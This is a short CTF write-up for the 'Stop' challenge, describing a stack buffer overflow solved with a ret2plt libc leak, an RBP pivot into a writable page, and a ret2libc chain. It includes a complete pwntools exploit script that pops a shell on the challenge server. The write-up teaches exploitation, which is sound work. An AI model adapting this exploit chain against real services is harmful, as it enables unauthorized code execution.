# Stop

This has been explained in countless writeups, so I won't go over it largely, but there's NX and no PIE. 
So we can use ret2plt, like always, to leak a libc address.  

### LARGE PROBLEM!  
Main is quite a complex function. 
For the purposes of buffer overflow, this is irrelevant to us.
However, if we just overwrite RBP with a bunch of As,
it means that errors will be caused at an instruction like `mov DWORD PTR [rbp-0x8], 0x9` , 
and whenever pop is called(after rsp is set to rbp). 
Thus, we must give rbp some form of authentic value so we can basically move the stack somewhere else. 
There is a page mapped read and write inside of the binary at around `0x602000-0x603000` .
We can set rbp to a value around here to create a nice fake stack, then execute a ret2libc attack.  
```python
from pwn import *
NUM_TO_RET = 282
padding = b'A' * NUM_TO_RET
e = ELF("./stop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6")
poprdi = 0x0000000000400953 # pop rdi ; ret
poprsi = 0x0000000000400951
#p = e.process()
p = remote('p1.tjctf.org', 8001)
leak = flat(poprdi, e.got['printf'],poprsi, 0, 0, e.plt['printf'], 0x0000000000400747, word_size=64)
payload = padding[:-8] + p64(0x000000000602000 + 0x1000 - (0x20 + 0x8 * 10)) + leak
p.sendline(payload)
p.recvlines(9)
output = p.recvuntil("Which")[:-5]
output += b'\x00\x00'
printf = u64(output)
log.info(f"Printf: {hex(printf)}")
libcbase = printf - libc.symbols['printf']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
chain = flat(poprdi, next(libc.search(b"/bin/sh\x00")), poprsi, 0, 0, libc.symbols['system'], word_size=64)
payload = padding + chain
pause()
p.sendline(payload)
p.interactive()
```
